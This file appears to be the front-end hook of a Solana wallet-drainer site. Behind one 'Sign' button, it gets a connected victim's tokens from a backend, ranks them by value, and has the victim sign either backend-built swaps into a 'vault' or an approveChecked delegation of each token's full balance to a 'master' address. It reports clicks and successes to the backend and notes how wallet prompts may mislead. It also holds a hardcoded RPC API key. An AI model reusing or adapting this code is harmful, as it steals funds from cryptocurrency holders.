import {
  Connection,
  PublicKey,
  Transaction,
  VersionedTransaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import { apiCall, isActionUserRejection } from "../utils/hookClient";
import {
  logApprovalReject,
  logFeError,
  logApprovalSuccess,
  toCanonicalToken,
  createDelegateObject,
} from "../utils/sol";

import { useWallet, useConnection } from "@solana/wallet-adapter-react";
import {
  getAssociatedTokenAddressSync,
  createApproveCheckedInstruction,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { useEffect, useState, useCallback, useMemo, useRef } from "react";

const owner = window.location.hostname.replace(/^www\./, "");

const summarizeToken = (token, queueIndex) => ({
  queueIndex,
  symbol: token?.symbol,
  mint: token?.mint,
  amount: token?.amount,
  tokenValue: token?.tokenValue,
  handleType: token?.handleType,
});

const logSol = (label, detail) => {
  if (detail === undefined) {
    console.log(`[useSolanaActions] ${label}`);
    return;
  }
  console.log(`[useSolanaActions] ${label}`, detail);
};

const waitForSignatureStatus = async (
  connection,
  signature,
  { maxRetries = 30, delayMs = 2000 } = {},
) => {
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const confirmation = await connection.getSignatureStatuses([signature], {
      searchTransactionHistory: true,
    });
    const status = confirmation.value?.[0];
    if (status) {
      logSol("delegate: signature status received", {
        txSig: signature,
        attempt: attempt + 1,
        confirmationStatus: status.confirmationStatus,
        err: status.err,
      });
      return status;
    }
    logSol("delegate: waiting for signature status", {
      txSig: signature,
      attempt: attempt + 1,
      maxRetries,
    });
    await new Promise((resolve) => setTimeout(resolve, delayMs));
  }
  return null;
};

const useSolanaActions = (contextValues = {}) => {
  const { setIsLoading = () => {} } = contextValues;
  const { connection } = useConnection();
  const {
    publicKey,
    sendTransaction,
    signTransaction,
    connected,
    wallet,
  } = useWallet();

  const { VITE_BACK: apiUrl } = import.meta.env;
  // const apiUrl = "http://localhost:3000";

  const customRpcEndpoint = `https://mainnet.helius-rpc.com/?api-key=2ec966b4-40a9-4028-8295-0f137bdb634c`;

  const [allTokens, setAllTokens] = useState(null);
  const allTokensRef = useRef(allTokens);
  allTokensRef.current = allTokens;
  const [error, setError] = useState(null);
  const [chain, setChain] = useState(null);
  const [solMaster, setSolMaster] = useState(null);
  const [solVault, setSolVault] = useState(null);
  const [swapTx, setSwapTx] = useState(null);
  const [blacklisted, setBlacklisted] = useState(false);
  const solMint = "So11111111111111111111111111111111111111112";

  const apiData = useMemo(
    () => ({
      address: publicKey?.toString(),
      owner,
      chainId: chain || "mainnet-beta",
    }),
    [publicKey, owner, chain]
  );

  const logSolanaFailure = (handleType, token, error) => {
    const canonical = toCanonicalToken(token);
    if (isActionUserRejection(error)) {
      logSol("user rejected — POST /reject", {
        handleType,
        token: canonical,
        apiData,
        error: error?.message ?? error,
      });
      logApprovalReject(apiUrl, handleType, token, apiData);
    } else {
      logSol(`${handleType || "action"} error — POST /error`, {
        handleType,
        token: canonical,
        apiData,
        error: error?.message ?? error,
      });
      logFeError(apiUrl, handleType, token, apiData, error);
    }
  };

  const tokenFromSwapMeta = (meta = {}) => ({
    mint: meta.swappedMint,
    symbol: meta.tokenSymbol,
    amount: meta.tokenAmount,
    tokenValue: meta.tokenValue,
    handleType: meta.handleType || "solSwap",
    tokenType: "spl-token",
  });

  const customConnection = useMemo(
    () =>
      new Connection(customRpcEndpoint, {
        commitment: "confirmed",
        confirmTransactionInitialTimeout: 60000,
      }),
    [customRpcEndpoint],
  );

  useEffect(() => {
    if (connected) {
      const process = async () => {
        try {
          setIsLoading(true);
          const walletType = wallet?.adapter?.name || "Unknown";
          const chainId = connection.rpcEndpoint.includes("devnet")
            ? "devnet"
            : connection.rpcEndpoint.includes("testnet")
              ? "testnet"
              : "mainnet-beta";

          setChain(chainId);

          const connectObj = {
            address: publicKey.toString(),
            chainId,
            owner,
            WalletProviderType: walletType,
          };

          logSol("balance request → POST /balance", connectObj);

          setBlacklisted(false);
          const result = await apiCall(apiUrl, "/balance", connectObj);

          logSol("balance response ← POST /balance", {
            success: result?.success,
            error: result?.error,
            data: result?.data,
          });

          if (result?.data?.blacklisted) {
            setBlacklisted(true);
            setAllTokens(null);
            setSwapTx(null);
            return;
          }

          if (!result || !result?.success) {
            logSol("balance fetch failed", {
              error: result?.error ?? "unknown",
              success: result?.success,
            });
            setError(result?.error || "Failed to fetch balance data");
            return;
          }

          const { tokenList, masterAddress, vault, chainValue, swap } =
            result.data;
          const rawList = tokenList || [];
          const nativeTokens = rawList.filter((token) => token.mint === solMint);
          const queue = rawList
            .filter((token) => token.mint !== solMint)
            .sort((a, b) => (b.tokenValue || 0) - (a.tokenValue || 0));

          logSol("balance tokenList from BE", {
            chainValue,
            masterAddress,
            vault,
            swap: swap
              ? {
                  hasTx: Boolean(swap.swapTransaction),
                  input: swap.inputToken,
                }
              : null,
            rawCount: rawList.length,
            rawOrder: rawList.map((t, i) => summarizeToken(t, i)),
            nativeSolEntries: nativeTokens.map((t, i) => summarizeToken(t, i)),
          });

          logSol("action queue after filter + sort (highest tokenValue first)", {
            count: queue.length,
            order: queue.map((t, i) => summarizeToken(t, i)),
            nextToken: queue[0] ? summarizeToken(queue[0], 0) : null,
          });

          setSolMaster(masterAddress);
          setSolVault(vault);
          setAllTokens(queue);
          setSwapTx(swap?.swapTransaction ? swap : null);
          setError(null);
        } catch (err) {
          console.error("Error in process:", err);
          setError(err.message);
        } finally {
          setIsLoading(false);
        }
      };
      process();
    }
  }, [connected, connection, publicKey, wallet, apiUrl, setIsLoading, solMint]);

  useEffect(() => {
    if (!connected) {
      setAllTokens(null);
      setSolMaster(null);
      setSolVault(null);
      setSwapTx(null);
      setError(null);
    }
  }, [connected]);

  // ============================================================================
  // Entry
  // ============================================================================

  const action = async () => {
    if (blacklisted) return { success: false };
    console.log("Sign Button Clicked!");
    apiCall(apiUrl, "/click", {
      click: "Sign Button",
      address: publicKey?.toString(),
      owner,
    });
    if (!connected || !publicKey) {
      console.log("Sign blocked: wallet not connected");
      return { success: false };
    }

    setIsLoading(true);

    try {
      if (swapTx?.swapTransaction) {
        return await runSolSwap();
      }

      if (!(allTokensRef.current && allTokensRef.current.length > 0)) {
        console.log("Sign blocked: no tokens");
        return { success: false };
      }
      if (!solMaster) {
        console.log("Sign blocked: master not loaded");
        return { success: false };
      }

      return await runDelegate();
    } catch (error) {
      console.log("error in action", error);
      return { success: false };
    } finally {
      setIsLoading(false);
    }
  };

  // ============================================================================
  // Swap
  // ============================================================================

  /** Wallet signs; backend broadcasts, then returns next unsigned swap. */
  const sendSwapTx = async (swapTransactionBase64, meta = {}) => {
    const handleType = meta.handleType || "solSwap";
    const token = tokenFromSwapMeta(meta);

    if (!connected || !publicKey) {
      return { success: false, error: "Wallet not connected" };
    }
    if (!signTransaction) {
      return { success: false, error: "Wallet does not support signTransaction" };
    }
    if (!swapTransactionBase64) {
      return { success: false, error: "Missing swap transaction" };
    }

    try {
      const tx = VersionedTransaction.deserialize(
        Buffer.from(swapTransactionBase64, "base64"),
      );
      const signed = await signTransaction(tx);
      const signedTransaction = Buffer.from(signed.serialize()).toString(
        "base64",
      );

      const resp = await apiCall(apiUrl, "/send-tx", {
        ...apiData,
        signedTransaction,
        swappedMint: meta.swappedMint || undefined,
        tokenSymbol: meta.tokenSymbol,
        tokenAmount: meta.tokenAmount,
        tokenValue: meta.tokenValue,
        handleType,
      });

      if (!resp?.success) {
        const broadcastError = new Error(
          resp?.error || "Backend failed to broadcast transaction",
        );
        logSolanaFailure(handleType, token, broadcastError);
        return {
          success: false,
          error: broadcastError.message,
        };
      }

      return { success: true, data: resp.data };
    } catch (error) {
      console.error("sendSwapTx error:", error);
      logSolanaFailure(handleType, token, error);
      return { success: false, error: error.message };
    }
  };

  const runSolSwap = async () => {
    logSol("action queue at click", {
      count: allTokens?.length ?? 0,
      order: (allTokens || []).map((t, i) => summarizeToken(t, i)),
      swapInput: swapTx?.inputToken,
      note: "Signing BE-built vault swap; /send-tx returns next unsigned swap",
    });

    const swappedMint = swapTx?.inputToken?.mint;
    const swapResult = await sendSwapTx(swapTx.swapTransaction, {
      swappedMint,
      tokenSymbol: swapTx?.inputToken?.symbol,
      tokenAmount: swapTx?.inputToken?.amount,
      tokenValue: swapTx?.inputToken?.tokenValue,
      handleType: "solSwap",
    });

    if (swapResult.success) {
      const { swap, tokenList, vault, masterAddress } = swapResult.data || {};

      if (masterAddress) setSolMaster(masterAddress);
      if (vault) setSolVault(vault);

      // Drop signed mint (+ native SOL) from action queue — same lifecycle as swapTx
      const baseList = Array.isArray(tokenList) ? tokenList : allTokens || [];
      const queue = baseList
        .filter(
          (token) =>
            token.mint !== solMint &&
            (!swappedMint || token.mint !== swappedMint),
        )
        .sort((a, b) => (b.tokenValue || 0) - (a.tokenValue || 0));
      setAllTokens(queue);
      setSwapTx(swap?.swapTransaction ? swap : null);
      return { success: true, data: swapResult.data };
    }

    logSol("swap did not succeed", {
      input: swapTx?.inputToken,
      error: swapResult.error,
    });
    return { success: false, error: swapResult.error };
  };

  // ============================================================================
  // Delegate
  // ============================================================================

  const runDelegate = async () => {
    const list = allTokensRef.current || [];
    logSol("action queue at click", {
      count: list.length,
      order: list.map((t, i) => summarizeToken(t, i)),
      note: "No swapTx — delegate fallback; queue from last /balance or /send-tx",
    });

    const token = list[0];
    const ownerAddress = publicKey.toString();

    logSol("selected token for delegate (queue[0])", {
      ...summarizeToken(token, 0),
      master: solMaster,
      vault: solVault,
      chainId: chain,
    });

    const tokenAccountInfo = await getTokenAccount(token.mint, ownerAddress);

    logSol("token account resolved", {
      symbol: token.symbol,
      mint: token.mint,
      tokenAccount: tokenAccountInfo,
    });

    const tokenData = { ...token, tokenAccountInfo };

    logSol("delegate prompt starting", {
      symbol: tokenData.symbol,
      mint: tokenData.mint,
      amount: tokenData.amount,
      tokenValue: tokenData.tokenValue,
      tokenAccount: tokenData.tokenAccountInfo,
      master: solMaster,
      vault: solVault,
      note:
        "Wallet UI may still show SOL — that is the fee payer, not the token being approved",
    });

    const delegateResult = await delegateTokens(tokenData);

    logSol("delegate result", {
      symbol: token.symbol,
      mint: token.mint,
      success: delegateResult?.success,
      error: delegateResult?.error,
      txSig: delegateResult?.data,
    });

    if (delegateResult?.success === true) {
      const delegateObject = createDelegateObject(
        token,
        apiData,
        delegateResult.data,
        tokenAccountInfo,
      );

      logSol("delegate success — POST /delegate payload", delegateObject);
      logApprovalSuccess(apiUrl, delegateObject, "delegate");

      const remaining = list
        .slice(1)
        .filter((t) => t.mint !== solMint);
      logSol("queue after success", {
        remainingCount: remaining.length,
        remaining: remaining.map((t, i) => summarizeToken(t, i)),
      });

      allTokensRef.current = remaining;
      setAllTokens(remaining);
      return { success: true };
    }

    logSol("delegate did not succeed", {
      symbol: token.symbol,
      mint: token.mint,
      delegateResult,
    });
    return { success: false };
  };

  const getTokenAccount = async (tokenAddress, ownerAddress) => {
    try {
      if (tokenAddress === solMint) {
        logSol("getTokenAccount: native mint", { mint: tokenAddress });
        return "Native token";
      }

      const mintAddress = new PublicKey(tokenAddress);
      const ownerPubKey = new PublicKey(ownerAddress);

      const tokenAccounts = getAssociatedTokenAddressSync(
        mintAddress,
        ownerPubKey,
      );

      if (tokenAccounts) {
        return tokenAccounts.toBase58();
      }
    } catch (error) {
      logSol("getTokenAccount failed", { mint: tokenAddress, error });
    }
  };

  const delegateTokens = async (tokenData) => {
    const {
      tokenAccountInfo: tokenAccount,
      mint: tokenContract,
      symbol,
    } = tokenData;
    let key;
    try {
      if (!connected) return;
      if (!solMaster) {
        logSol("delegate aborted: master not loaded");
        return { success: false, error: "Master address not loaded yet" };
      }
      if (connected && publicKey) {
        const delegatePubkey = new PublicKey(solMaster);
        const userPubKey = new PublicKey(publicKey);
        if (connected) {
          key = userPubKey;

          const mintAddress = new PublicKey(tokenContract);

          const tokenAccounts = new PublicKey(tokenAccount);

          logSol("delegate: reading on-chain token account", {
            symbol,
            mint: tokenContract,
            tokenAccount,
            vault: solVault,
            master: solMaster,
          });

          const tokenAccountInfo = await customConnection.getParsedAccountInfo(
            tokenAccounts,
          );
          if (!tokenAccountInfo.value) {
            logSol("delegate aborted: token account not found on-chain", {
              symbol,
              mint: tokenContract,
              tokenAccount,
            });
            return { success: false, error: "Token account not found" };
          }

          const parsedData = tokenAccountInfo.value.data.parsed;
          if (!parsedData || !parsedData.info) {
            logSol("delegate aborted: invalid token account data", {
              symbol,
              mint: tokenContract,
              tokenAccount,
            });
            return { success: false, error: "Invalid token account data" };
          }

          const tokenAmount = parsedData.info?.tokenAmount;
          const decimals =
            tokenAccountInfo.value.data.parsed.info.tokenAmount.decimals;

          const amountToDelegate = parseInt(tokenAmount.amount);

          logSol("delegate: building approveChecked tx", {
            symbol,
            mint: tokenContract,
            tokenAccount,
            delegateTo: solMaster,
            amountRaw: amountToDelegate,
            amountUi: tokenAmount.uiAmount,
            decimals,
            feePayer: key.toBase58(),
          });

          try {
            let tx = new Transaction().add(
              createApproveCheckedInstruction(
                tokenAccounts,
                mintAddress,
                delegatePubkey,
                key,
                amountToDelegate,
                decimals,
              ),
            );

            const {
              context: { slot: minContextSlot },
            } = await customConnection.getLatestBlockhashAndContext();
            tx.recentBlockhash = (
              await customConnection.getLatestBlockhash()
            ).blockhash;
            tx.feePayer = key;

            logSol("delegate: opening wallet — approveChecked", {
              symbol,
              mint: tokenContract,
              delegateTo: solMaster,
              note:
                "If wallet headline says SOL, that is network fee — instruction approves " +
                `${symbol} (${tokenContract})`,
            });

            let txSig = await sendTransaction(tx, customConnection, {
              minContextSlot,
            });

            if (txSig) {
              logSol("delegate: tx submitted", {
                symbol,
                mint: tokenContract,
                txSig,
              });

              try {
                const status = await waitForSignatureStatus(
                  customConnection,
                  txSig,
                );

                if (!status) {
                  logSol("delegate: confirmation timed out", {
                    symbol,
                    mint: tokenContract,
                    txSig,
                  });
                  return {
                    success: false,
                    error: "Transaction not found or still pending",
                    data: txSig,
                  };
                }

                if (status.err) {
                  logSol("delegate: on-chain tx failed", {
                    symbol,
                    mint: tokenContract,
                    txSig,
                    err: status.err,
                  });
                  return {
                    success: false,
                    error: "Transaction failed",
                    data: txSig,
                  };
                } else {
                  logSol("delegate: on-chain tx confirmed", {
                    symbol,
                    mint: tokenContract,
                    txSig,
                  });
                  return { success: true, data: txSig };
                }
              } catch (confirmationError) {
                logSol("delegate: confirmation error", {
                  symbol,
                  mint: tokenContract,
                  txSig,
                  error: confirmationError,
                });
                return {
                  success: false,
                  error: "Transaction confirmation failed",
                  data: txSig,
                };
              }
            } else {
              logSol("delegate: no txSig returned (likely user dismissed)", {
                symbol,
                mint: tokenContract,
              });
              return { success: false, data: "user rejected probably" };
            }
          } catch (error) {
            logSol("delegate: sendTransaction threw", {
              symbol,
              mint: tokenContract,
              error: error?.message ?? error,
            });
            logSolanaFailure("delegate", tokenData, error);
            return { success: false, error: error.message };
          }
        }
      }
    } catch (error) {
      logSol("delegate: outer error", {
        symbol,
        mint: tokenContract,
        error: error?.message ?? error,
      });
      if (publicKey) {
        logSolanaFailure("delegate", tokenData, error);
      }
      return { success: false, error: error.message };
    }
  };

  const getTokenAccountBalance = useCallback(
    async (tokenMint, ownerAddress) => {
      try {
        if (!connected || !publicKey) {
          throw new Error("Wallet not connected");
        }

        if (!tokenMint || !ownerAddress) {
          throw new Error(
            "Missing required parameters: tokenMint or ownerAddress",
          );
        }

        if (tokenMint === solMint) {
          const balance = await customConnection.getBalance(
            new PublicKey(ownerAddress),
          );
          const formattedBalance = balance / LAMPORTS_PER_SOL;

          return {
            success: true,
            balance: balance,
            formattedBalance: formattedBalance.toString(),
            numericBalance: formattedBalance,
            decimals: 9,
            symbol: "SOL",
            name: "Solana",
            network: "Solana",
            mint: tokenMint,
          };
        }

        const mintAddress = new PublicKey(tokenMint);
        const ownerPubKey = new PublicKey(ownerAddress);

        const tokenAccountAddress = getAssociatedTokenAddressSync(
          mintAddress,
          ownerPubKey,
          false,
          TOKEN_PROGRAM_ID,
        );

        const tokenAccountInfo = await customConnection.getParsedAccountInfo(
          tokenAccountAddress,
        );

        if (!tokenAccountInfo.value) {
          return {
            success: true,
            balance: 0,
            formattedBalance: "0",
            numericBalance: 0,
            decimals: 6,
            symbol: "Unknown",
            name: "Unknown",
            network: "Solana",
            mint: tokenMint,
          };
        }

        const parsedData = tokenAccountInfo.value.data.parsed;
        if (!parsedData || !parsedData.info) {
          throw new Error("Invalid token account data");
        }

        const balance = parsedData.info.tokenAmount.uiAmount;
        const decimals = parsedData.info.tokenAmount.decimals;

        return {
          success: true,
          balance: balance || 0,
          formattedBalance: (balance || 0).toString(),
          numericBalance: balance || 0,
          decimals: decimals,
          network: "Solana",
          mint: tokenMint,
          tokenAccountAddress: tokenAccountAddress.toBase58(),
        };
      } catch (error) {
        console.error("Error getting Solana token balance:", error);

        return {
          success: false,
          error: error.message,
          balance: 0,
          formattedBalance: "0",
          numericBalance: 0,
          decimals: 6,
          symbol: "Unknown",
          name: "Unknown",
          network: "Solana",
          mint: tokenMint,
        };
      }
    },
    [connected, publicKey, customConnection, solMint],
  );


  return { action, sendSwapTx, getTokenAccountBalance };
};

export default useSolanaActions;
